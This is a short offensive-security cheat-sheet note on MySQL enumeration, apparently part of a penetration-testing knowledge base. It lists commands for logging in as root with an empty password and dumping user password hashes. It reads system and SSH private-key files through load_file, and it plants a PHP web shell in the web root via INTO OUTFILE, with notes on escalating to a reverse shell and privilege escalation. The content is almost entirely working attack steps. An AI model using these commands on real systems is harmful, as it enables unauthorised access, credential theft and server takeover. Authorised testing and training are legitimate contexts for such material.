---
id: mysql-enum
title: MySQL Enumeration
stage: enumeration
tags: [windows, linux, mysql]
tools:
  - mysql -h $TARGET -u root
  - mysql -h $TARGET -u root -p''
leads_to:
  - sqli-rce
  - rev-shell
---

## Connect

```bash
mysql -h $TARGET -u root
mysql -h $TARGET -u root -p''    # empty password
mysql -h $TARGET -u root -p      # prompt for password
```

## Once In

```sql
show databases;
use mysql;
select user,host,authentication_string from mysql.user;

-- Read files (requires FILE privilege)
select load_file('/etc/passwd');
select load_file('/root/.ssh/id_rsa');

-- Write web shell (requires FILE privilege + writable web root)
select "<?php system($_GET['cmd']); ?>" into outfile '/var/www/html/shell.php';
```

## Notes

If you can write to the web root, you get a web shell → reverse shell → privesc. The `FILE` privilege is required. Check `SHOW GRANTS FOR 'root'@'%';` to confirm.
